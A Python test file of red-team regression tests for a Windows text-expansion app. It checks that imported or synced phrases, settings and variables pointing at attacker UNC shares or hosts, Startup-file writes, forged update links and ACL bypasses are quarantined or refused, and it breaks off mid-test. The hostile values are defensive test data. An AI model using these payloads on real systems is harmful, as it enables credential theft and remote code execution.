"""Red-team findings (0.6.1): each test is an attack that worked on 0.6.0 and must now fail."""
import os
import sqlite3
import types

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

from phraseforge import app as appmod
from phraseforge import security
from phraseforge.db import Store, is_device_setting
from phraseforge.host import ExpansionRequest
from phraseforge.io_formats import import_dict


class _App:
    """The parts of the app approved_for() touches."""

    def __init__(self, store, answer=None):
        self.store = store
        self.skipped = []
        self.asked = []
        self.poster = types.SimpleNamespace(posted=types.SimpleNamespace(emit=lambda fn: None))
        self.tray = types.SimpleNamespace(notify=lambda *a: None)
        self.host = types.SimpleNamespace(_ui=lambda fn: (self.asked.append(1), answer or "")[1])


def _req(pid, automatic):
    r = ExpansionRequest(phrase_id=pid)
    r.automatic = automatic
    return r


PAYLOAD = {"format": "phraseforge",
           "folders": [{"id": 1, "name": "Shared", "output_target": "program",
                        "output_target_arg": r"\\attacker\share\tool.exe"}],
           "phrases": [{"description": "Greeting", "content": "Hello!", "folder_id": 1,
                        "triggers": [{"kind": "time", "value": "every:1"}]},
                       {"description": "Mail", "content": "Hi", "folder_id": None, "output_target": "email"}]}


def test_imported_program_output_target_is_not_run_automatically():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Greeting")
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=True)) is False
    assert app.asked == []                     # automatic: skipped without asking


def test_imported_program_output_target_asks_when_typed():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Greeting")
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=False)) is False
    assert app.asked == [1]


def test_imported_email_target_is_not_sent_automatically():
    s = Store(":memory:")
    import_dict(s, PAYLOAD)
    p = next(p for p in s.phrases() if p.description == "Mail")
    assert appmod.approved_for(_App(s), p, _req(p.id, automatic=True)) is False


@pytest.mark.parametrize("chord", ["win+r", "lwin+r", "Windows+r", "windows+x", "meta+r", "super+r", "cmd+r",
                                   "rwin", "lwinkey+r", "vk5b+r", "ctrl+esc", "ctrl+escape", "control+esc"])
def test_every_name_of_the_windows_key_is_privileged(chord):
    assert security.privileged_reason("key", [chord], {})
    assert security.scan_privileged("{#key " + chord + "}")


@pytest.mark.parametrize("chord", ["enter", "ctrl+c", "ctrl+shift+left", "alt+tab", "esc", "shift+esc", "f5"])
def test_ordinary_keys_stay_allowed(chord):
    assert security.privileged_reason("key", [chord], {}) is None


def _snapshot(tmp_path, settings, folders=()):
    src = Store(str(tmp_path / "remote.db"))
    for k, v in settings.items():
        src.set_setting(k, v)
    src.close()
    return tmp_path / "remote.db"


@pytest.mark.parametrize("key,value", [
    ("ai.openai_base_url", "https://collector.example/v1"), ("net.proxy_server", "attacker.example"),
    ("net.allow_private_hosts", "1"), ("backup.directory", r"\\attacker\loot"),
    ("ocr.log_file", r"\\attacker\loot\ocr.txt"), ("onenote.exe", r"C:\Users\Public\x.exe"),
    ("filesearch.commands", r"n = x | \\attacker\share\p.cmd | {query}"),
    ("filesearch.actions", r"Edit = \\attacker\p.exe | {path}"), ("sync.folder_path", r"\\attacker\sync"),
])
def test_a_pulled_or_opened_file_cannot_set_device_settings(tmp_path, key, value):
    """The setting is unset on this PC and set in the incoming file: it must not arrive."""
    assert is_device_setting(key)
    local = Store(":memory:")
    local.restore_from(_snapshot(tmp_path, {key: value, "ui.theme": "dark"}), untrusted="synced")
    assert local.setting(key, "") != value
    assert local.setting("ui.theme") == "dark"          # ordinary settings still sync


def test_device_settings_already_set_here_are_kept(tmp_path):
    local = Store(":memory:")
    local.set_setting("filesearch.commands", "mine")
    local.restore_from(_snapshot(tmp_path, {"filesearch.commands": "theirs"}), untrusted="imported")
    assert local.setting("filesearch.commands") == "mine"


def test_sync_changing_a_folder_output_target_requarantines_its_phrases(tmp_path):
    local = Store(str(tmp_path / "local.db"))
    from phraseforge.models import Folder, Phrase
    f = local.add_folder(Folder("Mine"))
    p = local.add_phrase(Phrase("Own", "plain text", folder_id=f.id))
    assert not local.quarantine_origin(p.id)
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE folders SET output_target='program', output_target_arg='C:\\\\x.bat' WHERE id=?", (f.id,))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(p.id) == "synced"


def test_legacy_output_target_setting_cannot_slip_past_the_check(tmp_path):
    import json
    local = Store(str(tmp_path / "local.db"))
    from phraseforge.models import Phrase
    p = local.add_phrase(Phrase("Own", "plain text"))
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("INSERT OR REPLACE INTO settings VALUES ('ui.trigger_extras', ?)",
                    (json.dumps({f"p:{p.id}": {"output_target": "program", "output_program": "C:\\x.bat"}}),))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    from phraseforge import output_target
    target = output_target.resolve(local, local.get_phrase(p.id))[0]
    assert target != "program" or local.quarantine_origin(p.id)


def test_settings_export_leaves_out_secrets(tmp_path):
    from phraseforge.db import SECRET_SETTINGS
    import json
    os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.settings_dialog import SettingsDialog
    s = Store(":memory:")
    s.set_setting("ai.openai_key", "sk-DUMMY")
    d = SettingsDialog(s)
    out = tmp_path / "s.json"
    d.export_to(str(out))
    data = json.loads(out.read_text(encoding="utf-8"))["settings"]
    assert not (set(data) & SECRET_SETTINGS)
    other = Store(":memory:")
    bad = tmp_path / "bad.json"
    bad.write_text(json.dumps({"format": "phraseforge-settings",
                               "settings": {"onenote.exe": "C:\\x.exe", "ui.theme": "dark"}}), encoding="utf-8")
    d2 = SettingsDialog(other)
    d2.import_from(str(bad))
    assert other.setting("onenote.exe", "") != "C:\\x.exe" and other.setting("ui.theme") == "dark"
    assert d2.import_skipped == ["onenote.exe"]


def test_clipboard_history_skips_content_marked_private():
    from phraseforge.clipboard_history import ClipboardHistory
    s = Store(":memory:")
    h = ClipboardHistory(s, foreground_app=lambda: ("keepassxc.exe", ""), marked_private=lambda: True)
    h.on_clipboard_text("Pa55w0rd")
    assert s.clipboard_entries(10) == []
    h2 = ClipboardHistory(s, foreground_app=lambda: ("notepad.exe", ""), marked_private=lambda: False)
    h2.on_clipboard_text("hello")
    assert [e.text for e in s.clipboard_entries(10)] == ["hello"]


def test_http_libraries_do_not_log_urls():
    import logging
    appmod.quiet_http_loggers()
    for name in ("httpx", "httpcore", "urllib3"):
        assert logging.getLogger(name).getEffectiveLevel() >= logging.WARNING


def test_cgnat_range_is_blocked():
    from phraseforge import net
    assert net.is_private_ip("100.100.100.200") and net.is_private_ip("100.64.0.1")
    assert not net.is_private_ip("100.128.0.1")


def test_custom_headers_are_dropped_on_a_redirect_to_another_host(monkeypatch):
    import httpx
    from phraseforge import net
    net.configure({})
    seen = {}

    def handler(request):
        seen[request.url.host] = request.headers.get("x-api-key")
        if request.url.host == "8.8.8.8":
            return httpx.Response(302, headers={"Location": "http://8.8.4.4/collect"})
        return httpx.Response(200, text="ok")

    real = httpx.Client
    monkeypatch.setattr(net.httpx, "Client", lambda **kw: real(**{**kw, "transport": httpx.MockTransport(handler)}))
    assert net.http_request("GET", "http://8.8.8.8/", headers={"x-api-key": "KEY"}) == "ok"
    assert seen == {"8.8.8.8": "KEY", "8.8.4.4": None}


def test_deeply_nested_xml_is_refused_cleanly(tmp_path):
    from phraseforge.importers import phraseexpress as pe
    f = tmp_path / "deep.xml"
    f.write_text("<folder>" * 5000 + "</folder>" * 5000, encoding="utf-8")
    with pytest.raises(ValueError, match="nested"):
        pe.import_xml(Store(":memory:"), f)


# ---------------------------------------------------------------- 0.6.3
def test_sync_changing_a_variable_requarantines_the_phrases_that_read_it(tmp_path):
    """An "Always allow" phrase builds {#run} from a global variable; a synced copy that only
    changes the variable must send the phrase back for approval."""
    from phraseforge.models import Phrase
    local = Store(str(tmp_path / "local.db"))
    tool = local.add_phrase(Phrase("Tool", "{#run {#var tool}}"))
    plain = local.add_phrase(Phrase("Plain", "hello"))
    local.set_var("tool", "notepad.exe")
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE vars SET value=? WHERE scope='global' AND name='tool'", (r"\\attacker\x.exe",))
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(tool.id) == "synced"
    assert not local.quarantine_origin(plain.id)


def test_dynamic_variable_name_counts_every_variable(tmp_path):
    from phraseforge.models import Phrase
    local = Store(str(tmp_path / "local.db"))
    p = local.add_phrase(Phrase("Dyn", "{#run {#var {#var which}}}"))
    local.set_var("a", "1")
    local.backup_to(str(tmp_path / "remote.db"))
    con = sqlite3.connect(str(tmp_path / "remote.db"))
    with con:
        con.execute("UPDATE vars SET value='2' WHERE name='a'")
    con.close()
    local.restore_from(tmp_path / "remote.db", untrusted="synced")
    assert local.quarantine_origin(p.id) == "synced"


def test_import_that_changes_a_variable_requarantines_its_readers():
    from phraseforge.models import Phrase
    s = Store(":memory:")
    p = s.add_phrase(Phrase("Tool", "{#run {#var tool -default notepad.exe}}"))
    assert not s.quarantine_origin(p.id)
    import_dict(s, {"format": "phraseforge", "vars": [{"name": "tool", "value": r"C:\x.bat", "scope": "global"}]})
    assert s.quarantine_origin(p.id) == "imported"


def test_local_variable_changes_do_not_quarantine():
    """Only data from elsewhere counts: the user's own {#set -scope global} changes nothing."""
    from phraseforge.models import Phrase
    s = Store(":memory:")
    p = s.add_phrase(Phrase("Counter", "{#run {#var tool}}"))
    s.set_var("tool", "calc.exe")
    assert not s.quarantine_origin(p.id)


@pytest.mark.parametrize("url,ok", [
    ("https://github.com/bahattab/B-PhraseForgeExpress/releases/tag/v0.6.3", True),
    ("https://github.com/bahattab/B-PhraseForgeExpress/releases/download/v0.6.3/B-PhraseForgeExpress-Setup-0.6.3.exe", True),
    ("http://github.com/bahattab/B-PhraseForgeExpress/releases/tag/v1", False),
    ("https://evil.example/bahattab/B-PhraseForgeExpress/releases/x.exe", False),
    ("https://github.com.evil.example/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("https://github.com/attacker/B-PhraseForgeExpress/releases/download/v1/x.exe", False),
    ("https://user@github.com/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("https://github.com:8443/bahattab/B-PhraseForgeExpress/releases/x", False),
    ("file:///C:/Windows/System32/calc.exe", False),
    (r"\\attacker\share\x.exe", False), ("", False), (None, False),
])
def test_update_links_must_point_to_this_projects_releases(url, ok):
    from phraseforge import updates
    assert bool(updates.safe_release_url(url)) is ok


def test_latest_release_drops_foreign_links():
    import io
    import json
    from phraseforge import updates

    class R(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    body = {"tag_name": "v9.9.9", "html_url": "https://evil.example/r",
            "assets": [{"name": "B-PhraseForgeExpress-Setup-9.9.9.exe",
                        "browser_download_url": "https://evil.example/Setup.exe"}]}
    rel = updates.latest_release(opener=lambda req, timeout=0: R(json.dumps(body).encode()))
    assert rel["url"] == updates.RELEASES_PAGE and rel["setup_url"] == ""


# ---------------------------------------------------------------- 0.6.4: review of PR #7
def test_choice_menu_brings_back_the_delimiter_and_erases_only_on_choice():
    """Several phrases share "sig": the space typed after it must come back, and the abbreviation
    is erased by the chosen phrase's own expansion (after unlock/approval), not when the menu opens."""
    import queue
    from phraseforge.app import PhraseForgeApp
    fake = types.SimpleNamespace(_jobs=queue.Queue(), _popup_app="notepad.exe", _popup_hwnd=42,
                                 popup=types.SimpleNamespace(language=""))
    shown = []
    fake.poster = types.SimpleNamespace(posted=types.SimpleNamespace(emit=lambda fn: fn()))
    fake._show_popup = lambda hwnd, folder=None, search=False, pending=(0, ""): (
        shown.append(folder), setattr(fake, "_popup_pending", pending))
    PhraseForgeApp._choice_cmd(fake, "5,6:3:32", 42)
    assert shown == ["choice:5,6"] and fake._jobs.empty()
    PhraseForgeApp._popup_phrase_chosen(fake, 6)
    kind, req, hwnd = fake._jobs.get_nowait()
    assert (kind, req.phrase_id, req.erase_chars, req.trailing_delimiter, hwnd) == ("expand", 6, 3, " ", 42)
    PhraseForgeApp._popup_phrase_chosen(fake, 5)                 # the next pick from a normal menu
    _, req2, _ = fake._jobs.get_nowait()
    assert (req2.erase_chars, req2.trailing_delimiter) == (0, "")


def test_choice_menu_hides_the_names_of_locked_phrases(tmp_path):
    os.environ["QT_QPA_PLATFORM"] = "offscreen"
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.db import hash_password
    from phraseforge.models import Folder, Phrase
    from phraseforge.security import LOCKS
    from phraseforge.ui.popup import PhrasePopup
    s = Store(":memory:")
    f = s.add_folder(Folder("Secret"))
    f.password_hash = hash_password("pw")
    s.update_folder(f)
    a = s.add_phrase(Phrase("Public", "a"))
    b = s.add_phrase(Phrase("Bank PIN", "1234", folder_id=f.id))
    pop = PhrasePopup(s)
    pop.show_at(10, 10, caret=None, folder=f"choice:{a.id},{b.id}")
    rows = [(pop.list.item(i).text(), pop.list.item(i).data(0x0100)) for i in range(pop.list.count())]
    texts = " ".join(t for t, _ in rows)
    assert "Public" in texts and "Bank PIN" not in texts and "Locked phrase" in texts
    pop.hide_all(force=True)


# ---------------------------------------------------------------- 0.6.5: review of #24 and #26
@pytest.mark.parametrize("content", [
    r'{#textfile "\\evil.example\s\a.txt"}', r'{#document "//evil.example/s/a.rtf"}',
    r'{#csv \\evil.example\s\a.csv -fromrow 1}', r'{#image "\\?\UNC\evil.example\s\a.png"}',
    r'{#embed "\\evil.example\s\a.txt"}', r'{#xls "\\evil.example\s\a.xlsx" -cell A1}',
    r'{#sql "//evil.example/s/db.sqlite" "SELECT 1"}', r'{#pastefile "\\evil.example\s\a.pdf"}'])
def test_reading_a_network_share_needs_an_approved_phrase(content):
    """R14: on Windows, opening \\\\host\\share sends the user's NTLM credentials to that host."""
    assert security.scan_privileged(content) == [security.NETWORK_READ]
    s = Store(":memory:")
    import_dict(s, {"format": "phraseforge", "phrases": [{"description": "Leak", "content": content}]})
    p = s.phrases()[0]
    app = _App(s)
    assert appmod.approved_for(app, p, _req(p.id, automatic=False)) is False and app.asked == [1]


def test_local_files_need_no_approval(tmp_path):
    f = tmp_path / "note.txt"
    f.write_text("local text", encoding="utf-8")
    for content in (f'{{#textfile "{f}"}}', r'{#document "C:\letters\a.docx"}', '{#image /home/me/a.png}'):
        assert security.scan_privileged(content) == []
    from phraseforge.host import ExpansionContext
    from phraseforge.macros.engine import MacroEngine
    from tests.test_macros import FakeHost
    out = MacroEngine(FakeHost()).expand_to_text(f'{{#textfile "{f}"}}', ExpansionContext(allow_privileged=False))
    assert out == "local text"


def test_a_network_path_built_at_run_time_is_blocked_too():
    """The static scan cannot see a path made by another macro; the engine checks it."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros.engine import MacroEngine
    from tests.test_macros import FakeHost
    content = "{#textfile {#lower //EVIL.EXAMPLE/S/A.TXT}}"
    assert security.scan_privileged(content) == []
    out = MacroEngine(FakeHost()).expand_to_text(content, ExpansionContext(allow_privileged=False))
    assert "blocked" in out


def test_docx_dtd_is_refused_in_any_encoding(tmp_path):
    """R17: the byte search for <!DOCTYPE missed a UTF-16 document.xml."""
    import zipfile
    from phraseforge.importers import files
    xml = ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE d [<!ENTITY a "AAAA">]>'
           '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
           '<w:body><w:p><w:r><w:t>&a;</w:t></w:r></w:p></w:body></w:document>')
    for enc in ("utf-16", "utf-8"):
        p = tmp_path / f"{enc}.docx"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("word/document.xml", xml.replace("UTF-16", enc.upper()).encode(enc))
        with pytest.raises(ValueError, match="DTD"):
            files.docx_paragraphs(p)


@pytest.mark.parametrize("rtf,text", [
    (r"{\rtf1\mac\ansicpg10000 caf\'8e\par}", "café"),          # old Mac RTF
    (r"{\rtf1\ansi\ansicpg0 a\'e9\par}", "aé"),                  # no such code page: RTF default
    (r"{\rtf1\ansi\ansicpg99999 a\'e9\par}", "aé"),
    (r"{\rtf1\mac caf\'8e}", "café"),
    (r"{\rtf1\ansi\uc1 hi \u-10179?\u-8576?}", "hi \U0001F680"),   # emoji as a surrogate pair (Word)
])
def test_rtf_with_any_code_page_still_reads(rtf, text):
    """R16: an unknown \\ansicpg raised LookupError and broke the import and {#document}."""
    from phraseforge.importers import files
    assert files.rtf_to_text(rtf) == text


def test_spelling_suggestions_never_block_the_menu():
    """R15: a long Arabic word kept the UI frozen for up to 30 s while Hunspell searched."""
    import threading
    import time
    from phraseforge import spell
    release = threading.Event()

    class Slow:
        def lookup(self, w):
            return False

        def suggest(self, w):
            release.wait(5)
            yield "صحيح"

    c = spell.SpellChecker(lambda k, d="": d, loader=lambda code: Slow())
    c.dictionary("ar", wait=True)
    start = time.monotonic()
    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # still searching
    assert time.monotonic() - start < 1
    assert c.suggest_within("خطأطويل", timeout=0.2) is None          # same search, not a second one
    for i in range(c.MAX_SEARCHES - 1):
        assert c.suggest_within(f"كلمة{i}", timeout=0.05) is None
    assert c.suggest_within("زائدة", timeout=0.05) is None            # limit reached: not started
    assert len(c._searching) == c.MAX_SEARCHES
    release.set()
    for _ in range(50):
        if c.suggest_within("خطأطويل", timeout=0.1) == ["صحيح"]:
            break
        time.sleep(0.02)
    assert c.suggest_within("خطأطويل") == ["صحيح"]                     # kept for the next click


def test_spell_settings_from_sync_cannot_name_a_path(tmp_path, monkeypatch):
    """R18: spell.latin came from synced settings and was used as a file name."""
    from phraseforge import spell
    monkeypatch.setenv("PHRASEFORGE_HOME", str(tmp_path / "data"))
    (tmp_path / "x.aff").write_text("SET UTF-8\n", encoding="utf-8")
    (tmp_path / "x.dic").write_text("1\nhello\n", encoding="utf-8")
    loaded = []
    settings = {"spell.latin": "../../x", "spell.arabic": "../x"}
    c = spell.SpellChecker(lambda k, d="": settings.get(k, d), loader=lambda code: loaded.append(code))
    assert c.code_for("latin") == "" and c.code_for("arabic") == ""
    assert not spell.installed("../../x")
    assert not c.is_misspelled("helo") and loaded == []


# ---------------------------------------------------------------- 0.6.6: shared database (#32)
@pytest.fixture
def shared(tmp_path):
    from phraseforge import policy
    from tests.test_shared import Client, sqlite_backend
    policy.set_current(policy.NO_POLICY)
    backend = sqlite_backend(tmp_path)
    clients = []

    def client(user):
        c = Client(backend, user)
        clients.append(c)
        return c
    yield client
    for c in clients:
        c.close()
    policy.set_current(None)


def _share(c, description, content):
    from phraseforge.models import Phrase
    p = c.store.add_phrase(Phrase(description, content, folder_id=c.root))
    c.sync()
    return p


def test_a_shared_phrase_signed_with_my_name_is_still_quarantined(shared):
    """R19: quarantine depended on modified_by, which the writing client fills in itself."""
    alice = shared("alice")
    forger = shared("alice")            # bob writing to the tables under alice's name
    _share(forger, "Report", '{#run "calc.exe"}')
    alice.sync()
    got = alice.phrases()["Report"]
    assert alice.store.quarantine_origin(got.id) == "synced"


def test_a_team_sharing_one_database_login_still_quarantines(shared):
    a, b = shared("team"), shared("team")
    _share(a, "Deploy", '{#run "deploy.cmd"}')
    b.sync()
    assert b.store.quarantine_origin(b.phrases()["Deploy"].id) == "synced"


def test_shared_approval_holds_until_the_content_changes(shared):
    a, b = shared("alice"), shared("bob")
    mine = _share(a, "Tool", '{#run "tool.exe"}')
    assert a.store.quarantine_origin(mine.id) is None          # my own phrase, pushed from here
    b.sync()
    got = b.phrases()["Tool"]
    b.store.release_quarantine(got.id)                          # bob approves it ("Always allow")
    mine = a.store.get_phrase(mine.id)
    mine.description = "Tool (renamed)"
    a.store.update_phrase(mine)
    a.sync()
    b.sync()
    got = b.store.get_phrase(got.id)
    assert got.description == "Tool (renamed)" and b.store.quarantine_origin(got.id) is None
    mine = a.store.get_phrase(mine.id)
    mine.content = '{#run "evil.exe"}'
    a.store.update_phrase(mine)
    a.sync()
    b.sync()
    assert b.store.get_phrase(got.id).content == '{#run "evil.exe"}'
    assert b.store.quarantine_origin(got.id) == "synced"         # new content: ask again
    assert a.store.quarantine_origin(mine.id) is None             # a's own echo stays approved


def test_a_conflict_copy_keeps_the_trust_of_the_edit_it_saves(shared):
    a, b = shared("alice"), shared("bob")
    _share(a, "Note", "v1")
    b.sync()
    got = b.phrases()["Note"]
    b.store.release_quarantine(got.id)
    got.content = "b's edit"
    b.store.update_phrase(got)
    p = a.phrases()["Note"]
    p.content = "a's edit"
    a.store.update_phrase(p)
    a.sync()
    b.sync()
    from phraseforge.shared.mirror import CONFLICT_SUFFIX
    copy = b.phrases()["Note" + CONFLICT_SUFFIX]
    assert copy.content == "b's edit" and b.store.quarantine_origin(copy.id) is None
    assert b.store.quarantine_origin(got.id) == "synced"         # a's text arrived: not approved here


# ====================================================================== 0.6.7: R20-R42
# Findings of the security review of #27, #28, #30, #32 and #33. Each test is the probe
# that showed the problem, turned around to show it is gone.
def _engine(store):
    from phraseforge.macros import MacroEngine
    from phraseforge.ui.main_window import PreviewHost
    return MacroEngine(PreviewHost(store), store)


@pytest.fixture
def qapp():
    from PySide6.QtWidgets import QApplication
    return QApplication.instance() or QApplication([])


def test_a_mailed_macro_becomes_plain_text_in_the_new_phrase(qapp):
    """R20: a sentence repeated in mails, with {#run ...} in it, became a live trusted phrase."""
    from phraseforge.macros.parser import Call, parse
    from phraseforge.ui.suggestions_dialog import SuggestionsDialog
    store = Store(":memory:")
    text = 'Please confirm the invoice {#run "calc.exe"} today.'
    store.merge_suggestions({text: 3})
    p = SuggestionsDialog(store).create_phrase(text, "inv")
    assert not any(isinstance(n, Call) for n in parse(store.get_phrase(p.id).content))
    assert _engine(store).expand_to_text(store.get_phrase(p.id).content) == text   # reads as typed
    store.clear_suggestions()                                                    # R42: can be forgotten
    assert store.suggestions(1) == []


def _signature_with_payload(store, tmp_path, quarantined):
    from phraseforge import signatures
    target = tmp_path / "Startup" / "evil.bat"
    p = signatures.new_signature(store, "Imported", f'Regards{{#outputfile "{target.as_posix()}" "start calc"}}')
    if quarantined:
        store.quarantine(p.id, "imported")
    return target


def test_signature_preview_and_export_never_run_an_unapproved_signatures_macros(qapp, tmp_path):
    """R21: opening the signature manager or exporting to Outlook wrote a file into Startup."""
    from phraseforge import signatures
    from phraseforge.ui.signatures_dialog import SignaturesDialog
    store = Store(":memory:")
    target = _signature_with_payload(store, tmp_path, quarantined=True)
    SignaturesDialog(store)                                    # previews the default signature
    assert not target.exists()
    signatures.export_outlook(store, signatures.preview_expand(store), tmp_path / "sig")
    assert not target.exists()
    assert "blocked" in (tmp_path / "sig" / "Imported.txt").read_text(encoding="utf-16")


def test_an_approved_signature_still_exports_with_its_macros(qapp, tmp_path):
    from phraseforge import signatures
    store = Store(":memory:")
    target = _signature_with_payload(store, tmp_path, quarantined=False)
    expand = signatures.preview_expand(store)
    assert "blocked" in expand(store.phrases()[0].content, "text")      # a preview never acts
    assert not target.exists()
    signatures.export_outlook(store, expand, tmp_path / "sig")
    assert target.read_text() == "start calc"                           # the user's own signature


def test_phrase_preview_does_not_write_files(tmp_path):
    """R21: the editor's Preview button ran {#outputfile}."""
    from phraseforge.ui.main_window import preview_text
    store = Store(":memory:")
    target = tmp_path / "x.txt"
    out = preview_text(store, f'a{{#outputfile "{target.as_posix()}" "x"}}')
    assert "blocked" in out and not target.exists()


def test_signature_file_names_keep_dots_and_never_collide(tmp_path):
    """R29: "Sig.v1" and "Sig.v2" both became Sig.htm; "Mr. Smith" became Mr.htm; CON is a device."""
    from phraseforge import signatures
    store = Store(":memory:")
    for name in ("Sig.v1", "Sig.v2", "Mr. Smith", "CON", "sig.V1"):
        signatures.new_signature(store, name, "Regards")
    written = signatures.export_outlook(store, lambda c, f, t=False: c, tmp_path)
    names = sorted(p.name for p in written)
    assert names == sorted(["Sig.v1.htm", "Sig.v2.htm", "Mr. Smith.htm", "_CON.htm", "sig.V1 (2).htm"])
    assert len({n.casefold() for n in names}) == 5
    assert set(signatures.outlook_names(store).values()) == {n[:-4] for n in names}   # registry = files


def _shared_env(tmp_path):
    from tests.test_shared import sqlite_backend
    from phraseforge import policy
    policy.set_current(policy.NO_POLICY)
    b = sqlite_backend(tmp_path)
    return b, b("admin")


def _not_saved(client):
    from phraseforge.shared.mirror import NOT_SAVED
    f = next((f for f in client.store.folders(None) if f.name == NOT_SAVED), None)
    return [] if f is None else client.store.phrases(f.id)


def test_a_phrase_the_server_refuses_stays_quarantined_in_not_saved(tmp_path):
    """R22: drag a pulled phrase out of a read-only folder, sync: the "Not saved" copy was trusted."""
    from tests.test_shared import Client
    from phraseforge import policy
    from phraseforge.shared.server import AclEntry, RemotePhrase
    b, adm = _shared_env(tmp_path)
    fid, _ = adm.create_folder("F", None)
    adm.add_acl(AclEntry(0, fid, "bob", "user", True, False))
    adm.create_phrase(RemotePhrase(0, fid, "evil", "{#run calc.exe}", "text", [{"kind": "autotext", "value": "ev#"}]))
    bob = Client(b, "bob")
    try:
        bob.sync()
        p = bob.phrases()["evil"]
        p.folder_id = bob.root
        bob.store.update_phrase(p, record_history=False)               # a drag-move keeps quarantine
        assert bob.sync().denied
        copies = _not_saved(bob)
        assert copies and all(bob.store.quarantine_origin(q.id) == "synced" for q in copies)
    finally:
        bob.close()
        adm.close()
        policy.set_current(None)


def test_deleting_a_folder_cannot_delete_a_protected_subfolder(tmp_path):
    """R30: delete_folder checked write rights only on the top folder of the delete."""
    import sqlite3 as sq
    from phraseforge import policy
    from phraseforge.shared.server import AclEntry, PermissionDenied, RemotePhrase
    b, adm = _shared_env(tmp_path)
    try:
        f, _ = adm.create_folder("F", None)
        g, _ = adm.create_folder("Secret", f)
        adm.create_phrase(RemotePhrase(0, g, "payroll", "salaries", "text", []))
        adm.add_acl(AclEntry(0, g, "bob", "user", False, False))
        bob = b("bob")
        with pytest.raises(PermissionDenied):
            bob.delete_folder(f, next(x.rev for x in bob.changes_since(0)[0] if x.id == f))
        bob.close()
        rows = sq.connect(str(tmp_path / "shared.db")).execute(
            "SELECT deleted FROM pf_folders UNION ALL SELECT deleted FROM pf_phrases").fetchall()
        assert all(r[0] == 0 for r in rows)                             # rolled back, nothing deleted
    finally:
        adm.close()
        policy.set_current(None)


def test_history_and_deletions_do_not_leak_text_the_user_may_not_read(tmp_path):
    """R31: history after a move out of a secret folder, after deleting the restricted parent,
    and the content of deleted rows in changes_since."""
    from phraseforge import policy
    from phraseforge.shared.server import AclEntry, RemotePhrase
    b, adm = _shared_env(tmp_path)
    try:
        s, _ = adm.create_folder("Secret", None)
        pub, _ = adm.create_folder("Public", None)
        pid, rev = adm.create_phrase(RemotePhrase(0, s, "draft", "SECRET v1", "text", []))
        adm.add_acl(AclEntry(0, s, "bob", "user", False, False))
        adm.update_phrase(RemotePhrase(pid, pub, "draft", "public text", "text", []), rev)
        bob = b("bob")
        assert [h.content for h in bob.history("phrase", pid)] == ["public text"]

        hr, _ = adm.create_folder("HR", None)
        sub, _ = adm.create_folder("Sub", hr)
        secret, _ = adm.create_phrase(RemotePhrase(0, sub, "payroll", "SECRET salaries", "text", []))
        adm.add_acl(AclEntry(0, hr, "bob", "user", False, False))
        adm.delete_folder(hr, next(x.rev for x in adm.changes_since(0)[0] if x.id == hr))
        assert bob.history("phrase", secret) == [] and bob.get_phrase(secret) is None
        gone = [p for p in bob.changes_since(0)[1] if p.id == secret]
        assert gone and gone[0].deleted and gone[0].content == "" and gone[0].description == ""
        bob.close()
    finally:
        adm.close()
        policy.set_current(None)


def test_setup_docs_give_users_read_only_permissions_table():
    """R23: the documented GRANTs let every user INSERT into pf_acl and make themselves admin."""
    from pathlib import Path
    doc = (Path(__file__).parent.parent / "docs" / "shared-database.md").read_text(encoding="utf-8")
    users = [ln for ln in doc.splitlines() if "pf_acl" in ln and "GRANT" in ln and ("Users" in ln or "pf_users" in ln)]
    assert users and all("INSERT" not in ln and "UPDATE" not in ln for ln in users)
    assert "ON ALL TABLES" not in doc


@pytest.mark.parametrize("content", [r'{#sound "\\host\share\x.wav"}', '{#sound "//host/s/x.wav"}'])
def test_sound_from_a_network_share_needs_approval(content):
    """R24: PlaySound on \\\\host sends this user's NTLM credentials to that host."""
    assert security.scan_privileged(content) == [security.NETWORK_READ]
    assert security.privileged_reason("sound", [r"\\host\x.wav"], {}) == security.NETWORK_READ
    assert security.privileged_reason("sound", ["beep"], {}) is None


def test_form_check_never_touches_a_network_path(monkeypatch):
    """R25: -validate filepath/folder ran os.path.isfile on \\\\host\\share as the form opened."""
    from phraseforge import formcheck
    touched = []
    monkeypatch.setattr(formcheck.os.path, "isfile", lambda p: touched.append(p) or True)
    monkeypatch.setattr(formcheck.os.path, "isdir", lambda p: touched.append(p) or True)
    assert formcheck.rule_error(r"\\attacker\share\x.txt", "filepath")
    assert formcheck.rule_error("//attacker/s", "folder")
    assert touched == []
    assert formcheck.rule_error(r"C:\x.txt", "filepath") == "" and touched == [r"C:\x.txt"]


def test_insert_by_number_checks_the_phrase_it_runs():
    """R26: {#insert "1"} ran phrase id 1 (quarantined) but checked the phrase described "1"."""
    from phraseforge.models import Phrase
    store = Store(":memory:")
    evil = store.add_phrase(Phrase("evil", '{#run "calc.exe"}'))
    store.quarantine(evil.id, "synced")
    store.add_phrase(Phrase(str(evil.id), "harmless"))
    started = []
    eng = _engine(store)
    eng.host.run_program = lambda cmd, args="", wait=False, workdir="": started.append(cmd) or 0
